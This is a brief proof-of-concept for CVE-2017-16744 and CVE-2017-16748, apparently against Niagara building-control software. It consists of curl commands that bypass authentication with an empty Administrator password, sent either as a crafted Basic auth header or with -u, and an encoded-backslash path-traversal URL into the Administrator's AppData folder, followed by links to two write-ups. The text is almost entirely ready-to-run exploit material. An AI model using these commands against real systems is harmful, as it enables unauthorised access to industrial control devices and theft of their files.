curl http://example.com:3011/niagara/%5C%20 -H "Authorization Basic: QWRtaW5pc3RyYXRvcjog"

Alternative option

curl -u 'Administrator:' --base http://example.com:3011/niagara/%5C%20 


To traverse for example:, http://example.com:3011/niagara/%5C..%5C..%5C..%5C..%5CUsers%5CAdministrator%5CAppData%5CLocal%5C%20

More Info:
https://gainsec.com/2019/09/13/poc-for-cve-2017-16744-and-cve-2017-16748/
https://blog.stratumsecurity.com/2018/09/06/cve-2017-16744-and-cve-2017-16748/
